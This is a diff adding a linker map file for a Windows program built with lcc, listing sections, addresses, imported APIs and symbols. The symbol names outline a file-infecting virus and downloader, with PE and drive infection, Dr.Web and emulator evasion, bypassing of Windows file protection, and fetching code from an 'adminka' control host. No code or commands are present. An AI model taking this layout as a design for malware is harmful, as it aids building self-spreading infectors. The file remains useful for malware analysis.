@@ -1,0 +1,462 @@
+output   input     virtual
+section  section   address    tsize
+.text               401000  4800  46ac 
+
+         .text      401000   29c   29c  e:\lcc\lib\lcccrt0s.obj
+                    40109a              __except_handler3
+                    401219              _mainCRTStartup
+                    401294              _NtCurrentTeb
+         .text      40129c  431c  431c  kkqvx.obj
+                    4046ff              _LoadFileFromAdminka
+                    401761              _rndstr
+                    4015d4              _GetTicks1
+                    404648              _MemoryGetProcAddress@8
+                    4012b5              _InitKernel32
+                    4050d7              _InitInfectData
+                    404124              _FindPEheader
+                    40165e              _zaderjka_cyklom
+                    404c36              _u_memcpy
+                    404cef              _u_WriteFile
+                    401311              _InitUser32
+                    404e30              _u_istrstr
+                    40155a              _InitUrlmon
+                    401da4              _ProcessInactiveServices
+                    40134e              _InitSFC
+                    40502e              _CheckVersion
+                    401597              _InitCrypt32
+                    401868              _my_strcpy
+                    4017f1              _isSystemNT
+                    404c28              _u_free
+                    40355b              _softfind
+                    40140e              _InitADVAPI32
+                    4035d2              _ProcessLNK
+                    4013d3              _InitShell32
+                    40144b              _InitAPIbyStr
+                    403495              _GetDll
+                    4012f3              _InitCRTDLL
+                    405228              _MainThread@4
+                    404d11              _u_ReadFile
+                    40438f              _BuildImportTable
+                    404a2c              _DecodeData
+                    404f1d              _u_rand_range
+                    402464              _InfectPE
+                    4016be              _fool_drweb
+                    40519f              _ServiceMode
+                    4054b7              _StartMainThread
+                    40356d              _UnprotectFile
+                    401671              _AntiEmulator
+                    404d33              _u_CloseFile
+                    4017a7              _lowerstr
+                    403e11              _GetFuncAddr
+                    401392              _InitSFC_OS
+                    404837              _LoadFileFromRequest
+                    404d41              _u_SaveToFile
+                    405010              _WndProc@16
+                    403997              _rscan
+                    401846              _CloseCreateThreadEco
+                    404523              _MemoryLoadLibrary
+                    4019f7              _CheckService
+                    4022f6              _align
+                    404d79              _u_strstr
+                    403d94              _IsStrKERNEL32
+                    404b22              _GenerateKey
+                    403be1              _InfectDrive@4
+                    403fe6              _CheckKernel
+                    4048d1              _LoadFileFromInet
+                    40509b              _CreateOrOpenMutexes_WaitForMtx2Release
+                    404edb              _u_rand
+                    404219              _FinalizeSections
+                    40232f              _ReinfectSince17
+                    4034e9              _GetVictimEP
+                    404c7b              _u_CreateFile
+                    401602              _GetTicks2
+                    4040aa              _ProcessDLLimports
+                    40350d              _softfind_CSIDL
+                    4037c2              _ProcessEXE
+                    401884              _EditOwnToken_or_CheckFiltered
+                    4012ce              _InitCRTDLL_handle
+                    402041              _WriteOrGetLen_C_CODE
+                    4016dc              _serstr
+                    404198              _CopySections
+                    4019e7              _InitAVSVC
+                    40129c              _InitKernel32a
+                    404f43              _LoadAndStartDll
+                    4042f3              _PerformBaseRelocation
+                    404eb6              _u_strchr
+                    403e6b              _CheckFunc
+                    404c09              _u_alloc
+                    4044ab              _MemoryFreeLibrary
+                    40151d              _InitWininet
+                    4035a6              _rscanSehHandler
+                    404c5e              _u_memset
+                    4035c9              _rscanSehSafeCode
+                    4054e1              _main
+                    401b5d              _ProcessService
+                    403c2f              _InfectAllDrives@4
+                    404df3              _u_icmpchar
+         .text      4055b8    20    20  [e:\lcc\lib\libc.lib] stack.obj
+                    4055b8              __stackprobe
+         .text      4055d8    50    50  [e:\lcc\lib\libc.lib] strcpy.obj
+                    4055d8              _strcpy@8
+                    405601              _strcpy
+         .text      405628     c     c  [e:\lcc\lib\kernel32.lib] 216.obj
+                    405628              _FreeLibrary@4
+         .text      405634     c     c  [e:\lcc\lib\kernel32.lib] 330.obj
+                    405634              _GetModuleHandleA@4
+         .text      405640     c     c  [e:\lcc\lib\kernel32.lib] 633.obj
+                    405640              _RtlUnwind@16
+         .text      40564c     c     c  [e:\lcc\lib\kernel32.lib] 769.obj
+                    40564c              _VirtualFree@12
+         .text      405658     c     c  [e:\lcc\lib\kernel32.lib] 829.obj
+                    405658              _lstrcmpiA@8
+         .text      405664     c     c  [e:\lcc\lib\kernel32.lib] 838.obj
+                    405664              _lstrlenA@4
+         .text      405670     c     c  [e:\lcc\lib\crtdll.lib] 25.obj
+                    405670              __GetMainArgs
+         .text      40567c     c     c  [e:\lcc\lib\crtdll.lib] 386.obj
+                    40567c              __sleep
+         .text      405688     c     c  [e:\lcc\lib\crtdll.lib] 523.obj
+                    405688              _exit
+         .text      405694     c     c  [e:\lcc\lib\crtdll.lib] 609.obj
+                    405694              _raise
+         .text      4056a0     c     c  [e:\lcc\lib\crtdll.lib] 619.obj
+                    4056a0              _signal
+
+.bss                406000   cf4     0 
+
+
+         COMMON     406000   cf4   cf4  kkqvx.obj
+                    406000              __lstrlenW
+                    406004              __GetWindow
+                    406008              __DeleteFile
+                    40600c              __WideCharToMultiByte
+                    406010              __CryptCreateHash
+                    406014              __SendMessage
+                    406018              _ticks2
+                    40601c              ___InterlockedIncrement
+                    406020              __LookupPrivilegeValue
+                    406024              __SfcFileException
+                    406028              __strcat
+                    40602c              __lstrcatA
+                    406030              __ControlService
+                    406034              __CryptReleaseContext
+                    406038              __CloseServiceHandle
+                    40603c              __ReadFile
+                    406040              __ZeroMemory
+                    406044              ___toupper
+                    406048              __Process32First
+                    40604c              __InternetCloseHandle
+                    406050              __IsBadStringPtrW
+                    406054              __GetComputerName
+                    406058              __GetTempPath
+                    40605c              __RegQueryValueEx
+                    406060              __CryptHashData
+                    406064              __GetSidSubAuthorityCount
+                    406068              __GetExitCodeProcess
+                    40606c              __MoveWindow
+                    406070              __InitializeSecurityDescriptor
+                    406074              __EnumDesktopWindows
+                    406078              __CryptDecrypt
+                    40607c              __DispatchMessage
+                    406080              __StartService
+                    406084              __atoi
+                    406088              __SetErrorMode
+                    40608c              __OpenSCManager
+                    406090              __FindNextFile
+                    406094              __InitializeCriticalSection
+                    406098              __CryptSetKeyParam
+                    40609c              __GetClassName
+                    4060a0              __RegSetKeySecurity
+                    4060a4              __Process32Next
+                    4060a8              __ObtainUserAgentString
+                    4060ac              __OpenProcessToken
+                    4060b0              __GetDiskFreeSpace
+                    4060b4              __RegisterClass
+                    4060b8              __WinExec
+                    4060bc              __RegEnumKeyEx
+                    4060c0              __GetSidIdentifierAuthority
+                    4060c4              __GetProcAddress
+                    4060c8              __CryptDestroyHash
+                    4060cc              __wcslen
+                    4060d0              __GetModuleHandle
+                    4060d4              __RegOpenKeyEx
+                    4060d8              __GetUserName
+                    4060dc              __GetForegroundWindow
+                    4060e0              __OemToChar
+                    4060e4              __GetLocaleInfo
+                    4060e8              ___InterlockedDecrement
+                    4060ec              __SetWindowLong
+                    4060f0              __CharUpperBuff
+                    4060f4              __GetSystemDirectory
+                    4060f8              __SfcIsFileProtected
+                    4060fc              __HttpAddRequestHeadersA
+                    406100              __FindClose
+                    406104              _hw
+                    406108              __lstrlen
+                    40610c              _dll_len
+                    406110              __DefWindowProc
+                    406114              __LocalFree
+                    406120              _drvl
+                    40651c              __GetSidSubAuthority
+                    406520              __malloc
+                    406524              __SetSecurityDescriptorOwner
+                    406528              __EnumServicesStatus
+                    40652c              __CreatePipe
+                    406530              __LocalAlloc
+                    406534              __free
+                    406538              _upx_sect
+                    40653c              __GetCurrentProcessId
+                    406540              __SetFocus
+                    406544              __CryptGetHashParam
+                    406548              __SHGetFolderPath
+                    40654c              __SetSecurityDescriptorDacl
+                    406550              __DestroyWindow
+                    406554              __IsBadReadPtr
+                    406558              __GetCurrentThreadId
+                    40655c              __LoadLibrary
+                    406560              __VirtualAlloc
+                    406564              __vsprintf
+                    406568              _hI
+                    40656c              __FindFirstFile
+                    406570              __GetSystemTime
+                    406574              __CopyFile
+                    406578              __GetMessage
+                    40657c              __VirtualFree
+                    406580              __CreateProcess
+                    406584              __memcpy
+                    406588              __GetModuleFileName
+                    406590              _SECTNAME
+                    4065c4              __RegCreateKeyEx
+                    4065c8              __PeekNamedPipe
+                    4065cc              __CryptDestroyKey
+                    4065d0              __VirtualProtect
+                    4065d4              __AdjustTokenPrivileges
+                    4065d8              _ticks1
+                    4065dc              __CreateToolhelp32Snapshot
+                    4065e0              __CryptAcquireContext
+                    4065e4              __memset
+                    4065e8              __HttpSendRequestA
+                    4065ec              _EMUL
+                    4065f0              __OpenMutex
+                    4065f4              __CryptAcquireContextA
+                    4065f8              __ChangeServiceConfig
+                    4065fc              __CreateWindowEx
+                    406600              __HttpOpenRequestA
+                    406604              __LeaveCriticalSection
+                    406608              __FreeEnvironmentStrings
+                    40660c              __CloseHandle
+                    406610              _szinfcode
+                    406614              __srand
+                    406618              __InternetConnectA
+                    40661c              __CallWindowProc
+                    406620              __InternetOpenA
+                    406630              _AVSVC
+                    406830              _dll_mem
+                    406834              __GetVolumeInformation
+                    406838              __RegCloseKey
+                    40683c              __CreateMutex
+                    406840              __GetTokenInformation
+                    406844              __GetFileSize
+                    406848              __GetWindowLong
+                    40684c              __GetEnvironmentStrings
+                    406850              __WaitForSingleObject
+                    406854              ___sleep
+                    406858              __sprintf
+                    40685c              _sdelay
+                    406860              __FindWindowEx
+                    406864              __CreateDirectory
+                    406868              __MultiByteToWideChar
+                    40686c              __CryptImportKey
+                    406870              __MessageBox
+                    406874              __memcmp
+                    406878              __CryptStringToBinaryA
+                    40687c              __GetExitCodeThread
+                    406880              __GetWindowRect
+                    406884              __SetWindowText
+                    406888              __ShowWindow
+                    40688c              __EnterCriticalSection
+                    406890              __ExitThread
+                    406894              __GetDriveType
+                    406898              __SetFileSecurity
+                    40689c              __QueryServiceConfig
+                    4068a0              __GetTickCount
+                    4068a4              __FileTimeToSystemTime
+                    4068a8              __TranslateMessage
+                    4068ac              __InternetReadFile
+                    4068b0              __CompareFileTime
+                    4068b4              __CreateFile
+                    4068b8              __FreeLibrary
+                    4068c0              _htrd
+                    406cbc              __WriteFile
+                    406cc0              __CreateThread
+                    406cc4              __TerminateProcess
+                    406cc8              _infsize
+                    406ccc              __GetVersionEx
+                    406cd0              __RegSetValueEx
+                    406cd4              __OutputDebugStringA
+                    406cd8              __OpenProcess
+                    406cdc              __SetFilePointer
+                    406ce0              __GetWindowText
+                    406ce4              __OpenService
+                    406ce8              __TerminateThread
+                    406cec              __rand
+                    406cf0              __Sleep
+
+.data               407000  1200  1144 
+
+         .data      407000    94    94  e:\lcc\lib\lcccrt0s.obj
+                    407014              __InitialStack
+                    407028              __environ
+                    407024              ___argv
+                    407000              __bss_base__
+                    407018              __lastKnownGoodEBP
+                    407004              __bss_end__
+                    407090              __CurrentContext
+                    407030              __ExceptionCode
+                    407008              __fmode
+                    40702c              __plccStackTrace
+                    407034              __ExceptionPointers
+                    40700c              __ShadowStack
+                    40708c              __CurrentException
+                    407020              ___argc
+         .data      407094  10b0  10b0  kkqvx.obj
+                    40723c              __SFC_OS
+                    407198              _padrCRT
+                    4071d0              __USER32
+                    407328              _ptu
+                    407324              _MAJORW
+                    407354              _UserAgent
+                    407194              __CRTDLL
+                    407314              _padrUrlmon
+                    407358              _RC2_Password
+                    4070a0              _padrK32
+                    40731c              _padrCrypt32
+                    407310              __URLMON
+                    4071d4              _padrU32
+                    407330              _VIRULENCE
+                    407378              _nameLoadDll
+                    40735c              _HostAdminka
+                    407360              _SETFolderExts
+                    407240              __SHELL32
+                    407318              __CRYPT32
+                    407098              _padrK32a
+                    407094              __KERNEL32
+                    407244              __ADVAPI32
+                    407238              __SFC
+                    4072f0              __WININET
+                    40732c              _sdsc2
+                    407334              _ProtectionFlags
+                    407320              _SYSTEM_NT
+                    407248              _padrA32
+                    4072f4              _padrWininet
+
+.idata              409000   200   1dc 
+
+         .idata$2   409000    14    14  [e:\lcc\lib\kernel32.lib] 1.obj
+                    409000              $hkernel
+         .idata$2   409014    14    14  [e:\lcc\lib\crtdll.lib] 1.obj
+                    409014              $hcrtdll
+
+         .idata$3   409028    60    60  e:\lcc\lib\lcccrt0s.obj
+
+         .idata$4   409088     4     4  [e:\lcc\lib\kernel32.lib] 0.obj
+         .idata$4   40908c     4     4  [e:\lcc\lib\kernel32.lib] 1.obj
+         .idata$4   409090     4     4  [e:\lcc\lib\kernel32.lib] 216.obj
+         .idata$4   409094     4     4  [e:\lcc\lib\kernel32.lib] 330.obj
+         .idata$4   409098     4     4  [e:\lcc\lib\kernel32.lib] 633.obj
+         .idata$4   40909c     4     4  [e:\lcc\lib\kernel32.lib] 769.obj
+         .idata$4   4090a0     4     4  [e:\lcc\lib\kernel32.lib] 829.obj
+         .idata$4   4090a4     4     4  [e:\lcc\lib\kernel32.lib] 838.obj
+         .idata$4   4090a8     4     4  [e:\lcc\lib\crtdll.lib] 0.obj
+         .idata$4   4090ac     4     4  [e:\lcc\lib\crtdll.lib] 1.obj
+         .idata$4   4090b0     4     4  [e:\lcc\lib\crtdll.lib] 25.obj
+         .idata$4   4090b4     4     4  [e:\lcc\lib\crtdll.lib] 386.obj
+         .idata$4   4090b8     4     4  [e:\lcc\lib\crtdll.lib] 523.obj
+         .idata$4   4090bc     4     4  [e:\lcc\lib\crtdll.lib] 609.obj
+         .idata$4   4090c0     4     4  [e:\lcc\lib\crtdll.lib] 619.obj
+
+         .idata$5   4090c4     4     4  [e:\lcc\lib\kernel32.lib] 0.obj
+         .idata$5   4090c8     4     4  [e:\lcc\lib\kernel32.lib] 1.obj
+         .idata$5   4090cc     4     4  [e:\lcc\lib\kernel32.lib] 216.obj
+                    4090cc              __imp__FreeLibrary@4
+         .idata$5   4090d0     4     4  [e:\lcc\lib\kernel32.lib] 330.obj
+                    4090d0              __imp__GetModuleHandleA@4
+         .idata$5   4090d4     4     4  [e:\lcc\lib\kernel32.lib] 633.obj
+                    4090d4              __imp__RtlUnwind@16
+         .idata$5   4090d8     4     4  [e:\lcc\lib\kernel32.lib] 769.obj
+                    4090d8              __imp__VirtualFree@12
+         .idata$5   4090dc     4     4  [e:\lcc\lib\kernel32.lib] 829.obj
+                    4090dc              __imp__lstrcmpiA@8
+         .idata$5   4090e0     4     4  [e:\lcc\lib\kernel32.lib] 838.obj
+                    4090e0              __imp__lstrlenA@4
+         .idata$5   4090e4     4     4  [e:\lcc\lib\crtdll.lib] 0.obj
+         .idata$5   4090e8     4     4  [e:\lcc\lib\crtdll.lib] 1.obj
+         .idata$5   4090ec     4     4  [e:\lcc\lib\crtdll.lib] 25.obj
+                    4090ec              __imp___GetMainArgs
+         .idata$5   4090f0     4     4  [e:\lcc\lib\crtdll.lib] 386.obj
+                    4090f0              __imp___sleep
+         .idata$5   4090f4     4     4  [e:\lcc\lib\crtdll.lib] 523.obj
+                    4090f4              __imp__exit
+         .idata$5   4090f8     4     4  [e:\lcc\lib\crtdll.lib] 609.obj
+                    4090f8              __imp__raise
+         .idata$5   4090fc     4     4  [e:\lcc\lib\crtdll.lib] 619.obj
+                    4090fc              __imp__signal
+
+         .idata$6   409100     4     4  e:\lcc\lib\lcccrt0s.obj
+         .idata$6   409104     e     e  [e:\lcc\lib\kernel32.lib] 216.obj
+         .idata$6   409114    14    14  [e:\lcc\lib\kernel32.lib] 330.obj
+         .idata$6   409128     c     c  [e:\lcc\lib\kernel32.lib] 633.obj
+         .idata$6   409134     e     e  [e:\lcc\lib\kernel32.lib] 769.obj
+         .idata$6   409144     c     c  [e:\lcc\lib\kernel32.lib] 829.obj
+         .idata$6   409150     c     c  [e:\lcc\lib\kernel32.lib] 838.obj
+         .idata$6   40915c    10    10  [e:\lcc\lib\crtdll.lib] 25.obj
+         .idata$6   40916c     a     a  [e:\lcc\lib\crtdll.lib] 386.obj
+         .idata$6   409178     8     8  [e:\lcc\lib\crtdll.lib] 523.obj
+         .idata$6   409180     8     8  [e:\lcc\lib\crtdll.lib] 609.obj
+         .idata$6   409188     a     a  [e:\lcc\lib\crtdll.lib] 619.obj
+
+         .idata$7   409194     e     e  [e:\lcc\lib\kernel32.lib] 0.obj
+                    409194              $tkernel
+         .idata$7   4091a4     4     4  [e:\lcc\lib\kernel32.lib] 216.obj
+         .idata$7   4091a8     4     4  [e:\lcc\lib\kernel32.lib] 330.obj
+         .idata$7   4091ac     4     4  [e:\lcc\lib\kernel32.lib] 633.obj
+         .idata$7   4091b0     4     4  [e:\lcc\lib\kernel32.lib] 769.obj
+         .idata$7   4091b4     4     4  [e:\lcc\lib\kernel32.lib] 829.obj
+         .idata$7   4091b8     4     4  [e:\lcc\lib\kernel32.lib] 838.obj
+         .idata$7   4091bc     c     c  [e:\lcc\lib\crtdll.lib] 0.obj
+                    4091bc              $tcrtdll
+         .idata$7   4091c8     4     4  [e:\lcc\lib\crtdll.lib] 25.obj
+         .idata$7   4091cc     4     4  [e:\lcc\lib\crtdll.lib] 386.obj
+         .idata$7   4091d0     4     4  [e:\lcc\lib\crtdll.lib] 523.obj
+         .idata$7   4091d4     4     4  [e:\lcc\lib\crtdll.lib] 609.obj
+         .idata$7   4091d8     4     4  [e:\lcc\lib\crtdll.lib] 619.obj
+
+Section .text: 18092
+	e:\lcc\lib\lcccrt0s.obj:  668
+	kkqvx.obj:  17180
+	e:\lcc\lib\libc.lib: 112
+	e:\lcc\lib\kernel32.lib: 72
+
+Section .bss: 0
+
+Section .data: 4420
+	e:\lcc\lib\lcccrt0s.obj:  148
+	kkqvx.obj:  4272
+	e:\lcc\lib\libc.lib: 0
+	e:\lcc\lib\kernel32.lib: 0
+
+Section .idata: 476
+	e:\lcc\lib\crtdll.lib: 20
+	e:\lcc\lib\kernel32.lib: 20
+	e:\lcc\lib\lcccrt0s.obj:  96
+	e:\lcc\lib\kernel32.lib: 36
+	e:\lcc\lib\crtdll.lib: 28
+	e:\lcc\lib\kernel32.lib: 32
+	e:\lcc\lib\lcccrt0s.obj:  4
+	e:\lcc\lib\kernel32.lib: 100
+	e:\lcc\lib\crtdll.lib: 50
+	e:\lcc\lib\kernel32.lib: 36
+
+Section .edata: 0
+
+
